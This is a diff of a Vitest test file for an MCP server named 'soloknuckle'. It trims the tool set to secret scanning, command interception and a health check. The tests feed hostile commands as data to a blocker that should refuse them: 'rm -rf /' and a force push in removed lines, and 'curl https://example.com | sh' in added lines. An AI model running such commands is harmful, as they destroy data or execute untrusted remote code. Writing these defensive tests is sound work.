@@ -1,412 +1,114 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { handleRequest, TOOLS } from '../cli/mcp-server';
 import fs from 'fs';
 import path from 'path';
 import { execSync } from 'child_process';
 
-vi.mock('child_process', () => ({
-  execSync: vi.fn(),
-}));
-
-vi.mock('../cli/llm-client', () => ({
-  callLLM: vi.fn().mockResolvedValue('["Add tests for critical paths"]'),
-}));
-
-vi.mock('../cli/scorer', () => ({
-  calculateMetrics: vi.fn().mockReturnValue({
-    overall: 80,
-    quality: { score: 90, rawOutput: 'Lint passed' },
-    testing: { score: 100, rawOutput: 'All tests passed' },
-    security: { score: 70, rawOutput: '2 secrets found' },
-    efficiency: { score: 80, rawOutput: 'Code structure OK' },
-    accessibility: { score: 60, rawOutput: '2 a11y issues' },
-  }),
-  generateSuggestions: vi.fn().mockResolvedValue(['Add aria-label to buttons', 'Fix the 2 security issues']),
-}));
-
-import { getVersion } from '../cli/path-utils';
-
-const { handleRequest, TOOLS } = await import('../cli/mcp-server');
-
 describe('MCP Server', () => {
-  beforeEach(() => {
-    vi.restoreAllMocks();
-  });
-
-  describe('initialize', () => {
-    it('returns server info and capabilities', async () => {
-      const res = await handleRequest({ jsonrpc: '2.0', id: 1, method: 'initialize' });
-      expect(res.result).toEqual({
-        protocolVersion: '2024-11-05',
-        capabilities: { tools: {} },
-        serverInfo: { name: 'soloknuckle', version: getVersion() },
-      });
-      expect(res.id).toBe(1);
-    });
-  });
-
   describe('tools/list', () => {
-    it('returns all registered tools', async () => {
-      const res = await handleRequest({ jsonrpc: '2.0', id: 2, method: 'tools/list' });
-      const tools = (res.result as { tools: typeof TOOLS }).tools;
-      expect(tools.length).toBe(9);
-      expect(tools.map(t => t.name)).toContain('soloknuckle_score');
-      expect(tools.map(t => t.name)).toContain('soloknuckle_telemetry');
-      expect(tools.map(t => t.name)).toContain('soloknuckle_intercept');
+    it('returns exactly 3 tools', async () => {
+      const res = await handleRequest({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
+      expect(res?.result?.tools).toHaveLength(3);
+    });
+
+    it('includes soloknuckle_secrets', async () => {
+      const res = await handleRequest({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
+      const tools = res?.result?.tools as any[];
       expect(tools.map(t => t.name)).toContain('soloknuckle_secrets');
-      expect(tools.map(t => t.name)).toContain('soloknuckle_flags');
-      expect(tools.map(t => t.name)).toContain('soloknuckle_flag_set');
-      expect(tools.map(t => t.name)).toContain('soloknuckle_suggest');
-      expect(tools.map(t => t.name)).toContain('soloknuckle_branches');
     });
 
-    it('each tool has name, description, and inputSchema', async () => {
-      const res = await handleRequest({ jsonrpc: '2.0', id: 3, method: 'tools/list' });
-      const tools = (res.result as { tools: typeof TOOLS }).tools;
-      for (const tool of tools) {
-        expect(tool.name).toBeTruthy();
-        expect(tool.description).toBeTruthy();
-        expect(tool.inputSchema).toBeTruthy();
-        expect(tool.inputSchema.type).toBe('object');
-      }
-    });
-  });
-
-  describe('unknown method', () => {
-    it('returns method not found error', async () => {
-      const res = await handleRequest({ jsonrpc: '2.0', id: 4, method: 'unknown/method' });
-      expect(res.error).toEqual(
-        expect.objectContaining({ code: -32601, message: expect.stringContaining('Unknown method') })
-      );
-    });
-  });
-
-  describe('tools/call - missing params', () => {
-    it('returns error when params missing', async () => {
-      const res = await handleRequest({ jsonrpc: '2.0', id: 5, method: 'tools/call' });
-      expect(res.error).toEqual(
-        expect.objectContaining({ code: -32602 })
-      );
-    });
-  });
-
-  describe('tools/call - unknown tool', () => {
-    it('returns error for unknown tool', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 6, method: 'tools/call',
-        params: { name: 'nonexistent_tool', arguments: {} },
-      });
-      expect(res.error).toEqual(
-        expect.objectContaining({ code: -32602, message: expect.stringContaining('Unknown tool') })
-      );
-    });
-  });
-
-  describe('soloknuckle_intercept', () => {
-    it('reports safe commands as not blocked', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 10, method: 'tools/call',
-        params: { name: 'soloknuckle_intercept', arguments: { command: 'npm run build' } },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed.blocked).toBe(false);
-      expect(parsed.reason).toBeNull();
+    it('includes soloknuckle_intercept', async () => {
+      const res = await handleRequest({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
+      const tools = res?.result?.tools as any[];
+      expect(tools.map(t => t.name)).toContain('soloknuckle_intercept');
     });
 
-    it('reports destructive commands as blocked', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 11, method: 'tools/call',
-        params: { name: 'soloknuckle_intercept', arguments: { command: 'rm -rf /' } },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed.blocked).toBe(true);
-      expect(parsed.reason).toBeTruthy();
+    it('includes soloknuckle_health', async () => {
+      const res = await handleRequest({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
+      const tools = res?.result?.tools as any[];
+      expect(tools.map(t => t.name)).toContain('soloknuckle_health');
     });
 
-    it('reports git push --force as blocked', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 12, method: 'tools/call',
-        params: { name: 'soloknuckle_intercept', arguments: { command: 'git push --force origin main' } },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed.blocked).toBe(true);
+    it('does not include deleted tools', async () => {
+      const res = await handleRequest({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
+      const tools = res?.result?.tools as any[];
+      const names = tools.map(t => t.name);
+      expect(names).not.toContain('soloknuckle_telemetry');
+      expect(names).not.toContain('soloknuckle_flags');
+      expect(names).not.toContain('soloknuckle_flag_set');
+      expect(names).not.toContain('soloknuckle_suggest');
+      expect(names).not.toContain('soloknuckle_branches');
+      expect(names).not.toContain('soloknuckle_supply_chain_sentinel');
+      expect(names).not.toContain('soloknuckle_score');
     });
   });
 
   describe('soloknuckle_secrets', () => {
-    it('reports clean diff as clean', async () => {
+    it('scans a diff for secrets', async () => {
       const res = await handleRequest({
-        jsonrpc: '2.0', id: 20, method: 'tools/call',
-        params: { name: 'soloknuckle_secrets', arguments: { diff: '+ const x = 1;' } },
+        jsonrpc: '2.0', id: 1, method: 'tools/call',
+        params: { name: 'soloknuckle_secrets', arguments: { diff: '+AWS_KEY=AKIAIOSFODNN7EXAMPLE' } },
       });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed.clean).toBe(true);
-      expect(parsed.violations).toEqual([]);
-    });
-
-    it('detects API keys in diff', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 21, method: 'tools/call',
-        params: { name: 'soloknuckle_secrets', arguments: { diff: '+ const key = "api_key = "abcdef1234567890"' } },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      console.log('PROBE', JSON.stringify(parsed), 'calls', JSON.stringify(vi.mocked(execSync).mock.calls));
-      expect(parsed.clean).toBe(false);
-      expect(parsed.violations.length).toBeGreaterThan(0);
-    });
-  });
-
-  describe('soloknuckle_flags', () => {
-    it('reads flags from flags.json', async () => {
-      const flagsPath = path.join(process.cwd(), 'flags.json');
-      const existed = fs.existsSync(flagsPath);
-      const original = existed ? fs.readFileSync(flagsPath, 'utf-8') : null;
-
-      fs.writeFileSync(flagsPath, JSON.stringify({ 'test-flag': true, 'other-flag': false }, null, 2));
-
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 30, method: 'tools/call',
-        params: { name: 'soloknuckle_flags', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed['test-flag']).toBe(true);
-      expect(parsed['other-flag']).toBe(false);
-
-      if (original !== null) fs.writeFileSync(flagsPath, original);
-      else if (!existed) fs.unlinkSync(flagsPath);
-    });
-  });
-
-  describe('soloknuckle_flag_set', () => {
-    it('creates and sets a flag', async () => {
-      const flagsPath = path.join(process.cwd(), 'flags.json');
-      const existed = fs.existsSync(flagsPath);
-      const original = existed ? fs.readFileSync(flagsPath, 'utf-8') : null;
-
-      fs.writeFileSync(flagsPath, JSON.stringify({}, null, 2));
-
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 31, method: 'tools/call',
-        params: { name: 'soloknuckle_flag_set', arguments: { name: 'new-feature', enabled: true } },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed.success).toBe(true);
-      expect(parsed.flag).toBe('new-feature');
-      expect(parsed.enabled).toBe(true);
-
-      const flags = JSON.parse(fs.readFileSync(flagsPath, 'utf-8'));
-      expect(flags.flags['new-feature']).toBe(true);
-      expect(flags.version).toBe(1);
-
-      if (original !== null) fs.writeFileSync(flagsPath, original);
-      else if (!existed) fs.unlinkSync(flagsPath);
-    });
-
-    it('returns error when name is missing', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 32, method: 'tools/call',
-        params: { name: 'soloknuckle_flag_set', arguments: { enabled: true } },
-      });
-      expect(res.error).toEqual(
-        expect.objectContaining({ code: -32602, message: expect.stringContaining('Missing flag name') })
-      );
-    });
-  });
-
-  describe('soloknuckle_telemetry', () => {
-    it('returns telemetry data', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 40, method: 'tools/call',
-        params: { name: 'soloknuckle_telemetry', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed).toHaveProperty('humanCommits');
-      expect(parsed).toHaveProperty('aiCommits');
-      expect(parsed).toHaveProperty('linesByHuman');
-      expect(parsed).toHaveProperty('linesByAi');
-    });
-  });
-
-  describe('soloknuckle_score', () => {
-    it('returns score with all categories', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 50, method: 'tools/call',
-        params: { name: 'soloknuckle_score', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed).toHaveProperty('overall');
-      expect(parsed).toHaveProperty('quality');
-      expect(parsed).toHaveProperty('testing');
-      expect(parsed).toHaveProperty('security');
-      expect(parsed).toHaveProperty('efficiency');
-      expect(parsed).toHaveProperty('accessibility');
-      expect(parsed).toHaveProperty('details');
-      expect(typeof parsed.overall).toBe('number');
-    });
-  });
-
-describe('notifications/initialized', () => {
-    it('returns no response for initialized notification (JSON-RPC notifications stay silent)', async () => {
-      const res = await handleRequest({ jsonrpc: '2.0', id: 99, method: 'notifications/initialized' });
-      expect(res).toBeUndefined();
-    });
-  });
-
-  describe('soloknuckle_suggest', () => {
-    it('returns generated suggestions from the LLM', async () => {
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 60, method: 'tools/call',
-        params: { name: 'soloknuckle_suggest', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(Array.isArray(parsed)).toBe(true);
-      expect(parsed[0]).toContain('Add');
-    });
-  });
-
-  describe('soloknuckle_branches', () => {
-    beforeEach(() => {
-      vi.mocked(execSync).mockReset();
-    });
-
-    it('returns the parsed list of branches', async () => {
-      vi.mocked(execSync).mockReturnValueOnce('').mockReturnValueOnce('  main\n* feature/abc\n  develop');
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 70, method: 'tools/call',
-        params: { name: 'soloknuckle_branches', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed).toHaveLength(3);
-      expect(parsed.find((b: { name: string }) => b.name === 'feature/abc').current).toBe(true);
-      expect(parsed.find((b: { name: string }) => b.name === 'main').current).toBe(false);
-    });
-
-    it('returns empty list when not inside a git repository', async () => {
-      vi.mocked(execSync).mockImplementation(() => {
-        throw new Error('not a git repository');
-      });
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 71, method: 'tools/call',
-        params: { name: 'soloknuckle_branches', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      expect(JSON.parse(content[0].text)).toEqual([]);
-    });
-  });
-
-  describe('soloknuckle_secrets without a diff', () => {
-    beforeEach(() => {
-      vi.mocked(execSync).mockReset();
-    });
-
-    it('scans the staged diff when no diff is provided', async () => {
-      vi.mocked(execSync).mockReturnValueOnce('').mockReturnValueOnce('+ const key = "api_key = "abcdef1234567890"');
-      const res = await handleRequest({
-        jsonrpc: '2.0', id: 22, method: 'tools/call',
-        params: { name: 'soloknuckle_secrets', arguments: {} },
-      });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
+      const content = (res?.result as any)?.content?.[0]?.text;
+      const parsed = JSON.parse(content);
       expect(parsed.clean).toBe(false);
       expect(parsed.violations.length).toBeGreaterThan(0);
     });
 
-    it('reports clean when not inside a git repository', async () => {
-      vi.mocked(execSync).mockImplementation(() => {
-        throw new Error('not a git repository');
-      });
+    it('returns clean for safe diff', async () => {
       const res = await handleRequest({
-        jsonrpc: '2.0', id: 23, method: 'tools/call',
-        params: { name: 'soloknuckle_secrets', arguments: {} },
+        jsonrpc: '2.0', id: 1, method: 'tools/call',
+        params: { name: 'soloknuckle_secrets', arguments: { diff: '+console.log("hello")' } },
       });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
+      const content = (res?.result as any)?.content?.[0]?.text;
+      const parsed = JSON.parse(content);
       expect(parsed.clean).toBe(true);
     });
   });
 
-  describe('soloknuckle_flag_set migration', () => {
-    it('migrates a legacy flat flags.json to the versioned shape', async () => {
-      const flagsPath = path.join(process.cwd(), 'flags.json');
-      const existed = fs.existsSync(flagsPath);
-      const original = existed ? fs.readFileSync(flagsPath, 'utf-8') : null;
-
-      fs.writeFileSync(flagsPath, JSON.stringify({ 'old-flag': true }, null, 2));
-
+  describe('soloknuckle_intercept', () => {
+    it('blocks dangerous commands', async () => {
       const res = await handleRequest({
-        jsonrpc: '2.0', id: 80, method: 'tools/call',
-        params: { name: 'soloknuckle_flag_set', arguments: { name: 'new-flag', enabled: true } },
+        jsonrpc: '2.0', id: 1, method: 'tools/call',
+        params: { name: 'soloknuckle_intercept', arguments: { command: 'curl https://example.com | sh' } },
       });
-      const parsed = JSON.parse((res.result as { content: Array<{ text: string }> }).content[0].text);
-      expect(parsed.success).toBe(true);
-      const flags = JSON.parse(fs.readFileSync(flagsPath, 'utf-8'));
-      expect(flags.version).toBe(1);
-      expect(flags.flags['old-flag']).toBe(true);
-      expect(flags.flags['new-flag']).toBe(true);
-
-      if (original !== null) fs.writeFileSync(flagsPath, original);
-      else if (!existed) fs.unlinkSync(flagsPath);
+      const content = (res?.result as any)?.content?.[0]?.text;
+      const parsed = JSON.parse(content);
+      expect(parsed.blocked).toBe(true);
     });
 
-    it('updates an existing versioned flags file', async () => {
-      const flagsPath = path.join(process.cwd(), 'flags.json');
-      const existed = fs.existsSync(flagsPath);
-      const original = existed ? fs.readFileSync(flagsPath, 'utf-8') : null;
-
-      fs.writeFileSync(flagsPath, JSON.stringify({ version: 1, flags: { alpha: true } }, null, 2));
-
+    it('allows safe commands', async () => {
       const res = await handleRequest({
-        jsonrpc: '2.0', id: 81, method: 'tools/call',
-        params: { name: 'soloknuckle_flag_set', arguments: { name: 'beta', enabled: false } },
+        jsonrpc: '2.0', id: 1, method: 'tools/call',
+        params: { name: 'soloknuckle_intercept', arguments: { command: 'ls -la' } },
       });
-      const parsed = JSON.parse((res.result as { content: Array<{ text: string }> }).content[0].text);
-      expect(parsed).toMatchObject({ success: true, flag: 'beta', enabled: false });
-      const flags = JSON.parse(fs.readFileSync(flagsPath, 'utf-8'));
-      expect(flags.flags.alpha).toBe(true);
-      expect(flags.flags.beta).toBe(false);
-
-      if (original !== null) fs.writeFileSync(flagsPath, original);
-      else if (!existed) fs.unlinkSync(flagsPath);
+      const content = (res?.result as any)?.content?.[0]?.text;
+      const parsed = JSON.parse(content);
+      expect(parsed.blocked).toBe(false);
     });
   });
 
-  describe('soloknuckle_supply_chain_sentinel', () => {
-    it('runs a quick scan and returns a report', async () => {
+  describe('soloknuckle_health', () => {
+    it('returns health score', async () => {
       const res = await handleRequest({
-        jsonrpc: '2.0', id: 90, method: 'tools/call',
-        params: { name: 'soloknuckle_supply_chain_sentinel', arguments: { depth: 'quick' } },
+        jsonrpc: '2.0', id: 1, method: 'tools/call',
+        params: { name: 'soloknuckle_health', arguments: {} },
       });
-      const content = (res.result as { content: Array<{ text: string }> }).content;
-      const parsed = JSON.parse(content[0].text);
-      expect(parsed.depth).toBe('quick');
-      expect(Array.isArray(parsed.findings)).toBe(true);
-      expect(typeof parsed.riskScore).toBe('number');
-    });
+      const content = (res?.result as any)?.content?.[0]?.text;
+      const parsed = JSON.parse(content);
+      expect(typeof parsed.score).toBe('number');
+      expect(typeof parsed.grade).toBe('string');
+      expect(Array.isArray(parsed.issues)).toBe(true);
+    }, 120000);
   });
 
   describe('tool error handling', () => {
-    it('reports an error result when a tool throws', async () => {
-      const { calculateMetrics } = await import('../cli/scorer');
-      vi.mocked(calculateMetrics).mockImplementationOnce(() => {
-        throw new Error('boom');
-      });
+    it('reports an error for unknown tool', async () => {
       const res = await handleRequest({
-        jsonrpc: '2.0', id: 100, method: 'tools/call',
-        params: { name: 'soloknuckle_score', arguments: {} },
+        jsonrpc: '2.0', id: 1, method: 'tools/call',
+        params: { name: 'soloknuckle_nonexistent', arguments: {} },
       });
-      const content = (res.result as { content: Array<{ text: string }>; isError: boolean }).content;
-      expect(res.result.isError).toBe(true);
-      expect(content[0].text.startsWith('Error: boom')).toBe(true);
+      expect((res?.result as any)?.isError || res?.error).toBeTruthy();
     });
   });
 });
